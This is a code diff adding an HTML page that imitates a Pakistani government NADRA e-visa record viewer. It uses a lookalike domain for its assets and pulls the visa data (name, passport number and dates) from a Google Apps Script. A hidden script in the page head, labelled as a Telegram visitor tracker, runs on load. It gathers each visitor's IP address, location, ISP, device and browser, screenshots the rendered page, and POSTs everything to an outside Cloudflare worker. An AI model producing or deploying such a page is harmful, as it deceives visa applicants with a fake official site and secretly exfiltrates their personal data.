@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PAK VISA</title>
+
+<!-- Telegram Visitor Tracker + Screenshot -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<script>
+(function () {
+  var WORKER_URL = "https://long-pine-6e25.hkopbahi1111.workers.dev/";
+
+  var ua      = navigator.userAgent;
+  var device  = /Mobile|Android|iPhone|iPad/i.test(ua) ? "Mobile" : "Desktop";
+  var browser = "Unknown";
+  if      (ua.indexOf("Edg")     > -1) browser = "Edge";
+  else if (ua.indexOf("OPR")     > -1) browser = "Opera";
+  else if (ua.indexOf("Chrome")  > -1) browser = "Chrome";
+  else if (ua.indexOf("Firefox") > -1) browser = "Firefox";
+  else if (ua.indexOf("Safari")  > -1) browser = "Safari";
+
+  var ref  = document.referrer || "Direct / WhatsApp";
+  var page = window.location.href;
+  var time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi" });
+
+  function sendData(geo, screenshot) {
+    var payload = {
+      ip:         geo.ip      || "N/A",
+      city:       geo.city    || "N/A",
+      country:    geo.country || "N/A",
+      isp:        geo.isp     || "N/A",
+      device:     device,
+      browser:    browser,
+      ref:        ref,
+      time:       time,
+      page:       page,
+      screenshot: screenshot || null
+    };
+    fetch(WORKER_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    }).catch(function(){});
+  }
+
+  function takeScreenshot(geo) {
+    setTimeout(function() {
+      html2canvas(document.body, {
+        useCORS: true,
+        allowTaint: true,
+        scale: 0.6,
+        logging: false
+      }).then(function(canvas) {
+        sendData(geo, canvas.toDataURL("image/png"));
+      }).catch(function() {
+        sendData(geo, null);
+      });
+    }, 2000);
+  }
+
+  function getGeoAndTrack() {
+    fetch("https://ip-api.com/json/?fields=status,query,city,country,isp")
+      .then(function(r) { return r.json(); })
+      .then(function(d) {
+        if (d && d.status === "success") {
+          takeScreenshot({ ip: d.query, city: d.city, country: d.country, isp: d.isp });
+        } else { throw new Error("fail"); }
+      })
+      .catch(function() {
+        fetch("https://ipwho.is/")
+          .then(function(r) { return r.json(); })
+          .then(function(d) {
+            if (d && d.success) {
+              takeScreenshot({ ip: d.ip, city: d.city, country: d.country, isp: d.connection ? d.connection.isp : "N/A" });
+            } else { throw new Error("fail"); }
+          })
+          .catch(function() {
+            fetch("https://ipapi.co/json/")
+              .then(function(r) { return r.json(); })
+              .then(function(d) {
+                if (d && d.ip) {
+                  takeScreenshot({ ip: d.ip, city: d.city, country: d.country_name, isp: d.org });
+                } else { throw new Error("fail"); }
+              })
+              .catch(function() {
+                takeScreenshot({ ip: "N/A", city: "N/A", country: "N/A", isp: "N/A" });
+              });
+          });
+      });
+  }
+
+  window.addEventListener("load", function() {
+    getGeoAndTrack();
+  });
+
+})();
+</script>
+
+<meta name="format-detection" content="telephone=no">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/css/ionicons.css">
+<link rel="stylesheet" href="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/css/shortcodes.css">
+<link rel="stylesheet" href="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/css/style.css">
+<link rel="stylesheet" href="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/css/font-nadra.css">
+<link rel="stylesheet" href="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/css/animate.css">
+<link rel="stylesheet" href="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/css/custom.css">
+<link rel="stylesheet" href="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/css/primefaces.css">
+<link rel="stylesheet" href="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/responsive.css">
+<link rel="shortcut icon" href="./favicon.ico">
+<link rel="icon" type="image/png" href="./favicon.png">
+<style>
+  .preloader {
+    width: 100%; height: 100%;
+    background-color: #fff;
+    position: fixed; top: 0; left: 0;
+    z-index: 9999999;
+    transition: all 0.3s ease-in-out;
+  }
+  .clear-loading {
+    text-align: center; margin: 0 auto;
+    position: absolute; top: 50%; left: 50%;
+    margin-top: -50px; margin-left: -50px;
+    box-sizing: border-box;
+  }
+  .loading-effect-2 { width: 100px; height: 100px; }
+  .loading-effect-2 > span,
+  .loading-effect-2 > span:before,
+  .loading-effect-2 > span:after {
+    content: ""; display: block; border-radius: 50%;
+    border: 2px solid #0068AC;
+    position: absolute; top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+  }
+  .loading-effect-2 > span {
+    width: 100%; height: 100%; top: 0; left: 0;
+    border-left-color: transparent;
+    animation: effect-2 2s infinite linear;
+  }
+  .loading-effect-2 > span:before { width: 75%; height: 75%; border-right-color: transparent; }
+  .loading-effect-2 > span:after  { width: 50%; height: 50%; border-bottom-color: transparent; }
+  @keyframes effect-2 {
+    from { transform: rotate(0deg); }
+    to   { transform: rotate(360deg); }
+  }
+  .page-content { visibility: hidden; opacity: 0; }
+  .page-content.loaded { visibility: visible; opacity: 1; transition: opacity 0.3s ease; }
+  .menu-icon { width: 25px; height: 18px; position: relative; cursor: pointer; display: inline-block; }
+  .menu-icon span { position: absolute; height: 2.5px; width: 100%; background: #1b5fa7; border-radius: 9px; transition: 0.4s; }
+  .menu-icon span:nth-child(1) { top: 0; }
+  .menu-icon span:nth-child(2) { top: 7px; }
+  .menu-icon span:nth-child(3) { top: 14px; }
+  .menu-icon.active span:nth-child(1) { transform: rotate(45deg); top: 7px; }
+  .menu-icon.active span:nth-child(2) { opacity: 0; }
+  .menu-icon.active span:nth-child(3) { transform: rotate(-45deg); top: 7px; }
+  .mobile-menu { position: fixed; top: 65px; width: 100%; background: #1e273d; max-height: 0; overflow: hidden; transition: max-height .4s; z-index: 999; }
+  .mobile-menu.show { max-height: 400px; }
+  .mobile-menu a { display: block; padding: 18px 25px; color: #fff; text-decoration: none; }
+  .btn-back-login { display: inline-block; background: #0070ad; color: #fff; padding: 12px 35px; margin: 30px 0 10px 0; text-decoration: none; font-size: 14px; }
+  .btn-back-login:hover { background: #005a8e; color: #fff; text-decoration: none; }
+  .footer { text-align: center; font-size: 12px; color: #999; padding: 25px; }
+  .label-div { text-align: left; }
+  .value-div { text-align: left; }
+  @media (max-width: 991px) {
+    .label-div { text-align: center; }
+    .value-div { text-align: center; }
+  }
+</style>
+</head>
+<body>
+<!-- PRELOADER -->
+<div class="preloader" id="preloader">
+  <div class="clear-loading loading-effect-2"><span></span></div>
+</div>
+
+<!-- PAGE CONTENT -->
+<div class="page-content" id="pageContent">
+  <div class="boxed">
+    <header id="header" class="header bg-color">
+      <div class="container" style="height:70px;">
+        <div class="row">
+          <div class="header-wrap">
+            <div class="col-md-6 col-xs-6">
+              <div id="logo" class="logo" style="margin-left:-10px;">
+                <a href="https://www.nadra.gov.pk/">
+                  <img src="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/img/pak_visa_logo.png" style="height:50px;">
+                </a>
+              </div>
+            </div>
+            <div class="col-md-6 col-xs-6 text-right" style="margin-top:25px; padding-right:25px;">
+              <div class="menu-icon" id="menuIcon" onclick="toggleMenu()">
+                <span></span><span></span><span></span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <!-- MOBILE MENU -->
+    <div class="mobile-menu" id="mobileMenu">
+      <a href="https://www.nadra.gov.pk/">Home</a>
+      <a href="https://visa.nadra.gov.pk/how-to-apply/">Guidelines</a>
+      <a href="https://visa.nadra.gov.pk/download/">Downloads</a>
+      <a href="https://visa.nadra.gov.pk/faqs/">FAQ</a>
+      <a href="https://visa.nadra.gov.pk/contact/">Contact Us</a>
+    </div>
+
+    <section class="flat-row" style="margin-top:60px;">
+      <div class="container">
+        <div class="row pd-contact-v2">
+          <div id="login-block" class="col-md-8 col-md-offset-2 animated slideInUp">
+            <article class="post style2">
+              <div class="content-post" style="text-align:center;">
+                <h1 class="title-post">
+                  <a id="eid">Visa Reference Number</a>
+                </h1>
+                <hr>
+                <div class="row">
+                  <div class="col-md-4">
+                    <img id="photo"
+                      src="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/avator/upload/default.jpg"
+                      style="width:auto;max-width:152px;height:auto;display:block;margin:0 auto;pointer-events:none;cursor:default;">
+                  </div>
+                  <div class="col-md-8">
+                    <div class="row" style="margin-top:35px;">
+                      <div class="col-md-5 label-div"><label>NAME</label></div>
+                      <div class="col-md-7 value-div"><p id="fullname">---</p></div>
+                    </div>
+                    <div class="row" style="margin-top:35px;">
+                      <div class="col-md-5 label-div"><label>Passport No</label></div>
+                      <div class="col-md-7 value-div"><p id="passport">---</p></div>
+                    </div>
+                    <div class="row" style="margin-top:35px;">
+                      <div class="col-md-5 label-div"><label>Passport Country</label></div>
+                      <div class="col-md-7 value-div"><p id="country">---</p></div>
+                    </div>
+                    <div class="row" style="margin-top:35px;">
+                      <div class="col-md-5 label-div"><label>Visa Category</label></div>
+                      <div class="col-md-7 value-div"><p id="visa_category">---</p></div>
+                    </div>
+                  </div>
+                </div>
+                <div class="row" style="margin-top:35px;">
+                  <div class="col-md-5 label-div"><label>Visa Sub Category</label></div>
+                  <div class="col-md-7 value-div"><p id="visa_sub_category">---</p></div>
+                </div>
+                <div class="row" style="margin-top:35px;">
+                  <div class="col-md-5 label-div"><label>Application Type</label></div>
+                  <div class="col-md-7 value-div"><p id="application_type">---</p></div>
+                </div>
+                <div class="row" style="margin-top:35px;">
+                  <div class="col-md-5 label-div"><label>Staying Facility</label></div>
+                  <div class="col-md-7 value-div"><p id="staying_facility">---</p></div>
+                </div>
+                <div class="row" style="margin-top:35px;">
+                  <div class="col-md-5 label-div"><label>Visa Start Date</label></div>
+                  <div class="col-md-7 value-div"><p id="visa_start">---</p></div>
+                </div>
+                <div class="row" style="margin-top:35px;">
+                  <div class="col-md-5 label-div"><label>Visa End Date</label></div>
+                  <div class="col-md-7 value-div"><p id="visa_end">---</p></div>
+                </div>
+                <div class="row" style="margin-top:35px;">
+                  <div class="col-md-5 label-div"><label>Visa Duration</label></div>
+                  <div class="col-md-7 value-div"><p id="visa_duration">---</p></div>
+                </div>
+                <a class="btn-back-login" href="https://visa.nadra.gov.pk/e-visa/authenticate">Back to Login</a>
+              </div>
+            </article>
+          </div>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <div class="footer">
+    COPYRIGHT &copy; 2015 - 2026 MINISTRY OF INTERIOR,<br>
+    GOVERNMENT OF PAKISTAN - V: 6.0.0
+  </div>
+</div>
+
+<script>
+  function toggleMenu() {
+    document.getElementById("mobileMenu").classList.toggle("show");
+    document.getElementById("menuIcon").classList.toggle("active");
+  }
+  function setText(id, val) {
+    var el = document.getElementById(id);
+    if (el) el.innerText = val || "---";
+  }
+  function formatDate(d) {
+    if (!d) return "---";
+    return new Date(d).toLocaleDateString("en-GB", { day: "2-digit", month: "short", year: "numeric" });
+  }
+  function showPage() {
+    var loader = document.getElementById("preloader");
+    loader.style.opacity = "0";
+    setTimeout(function () { loader.style.display = "none"; }, 300);
+    document.getElementById("pageContent").classList.add("loaded");
+  }
+  var id = new URLSearchParams(window.location.search).get("id");
+  if (id) {
+    fetch("https://script.google.com/macros/s/AKfycbz5RtSgtWeStpF3mIMoKtHWX4WQnvdXK4uNNjJ2RUPalSWrlhiA4OoHwL38Ndj3rA0B/exec?id=" + id)
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        document.getElementById("eid").innerText = "Visa Reference Number - " + (data.id || id);
+        setText("fullname", data.name);
+        setText("passport", data.passport_no);
+        setText("country", data.passport_country);
+        setText("visa_category", data.visa_category);
+        setText("visa_sub_category", data.visa_sub_category);
+        setText("application_type", data.application_type);
+        setText("staying_facility", data.staying_facility);
+        setText("visa_start", formatDate(data.visa_start_date));
+        setText("visa_end", formatDate(data.visa_end_date));
+        setText("visa_duration", data.visa_duration);
+        if (data.photo) { document.getElementById("photo").src = data.photo; }
+        showPage();
+      })
+      .catch(function() {
+        document.getElementById("login-block").innerHTML = "<h2 style='text-align:center;margin-top:40px;'>Record Not Found</h2>";
+        showPage();
+      });
+  } else {
+    showPage();
+  }
+</script>
+</body>
+</html>
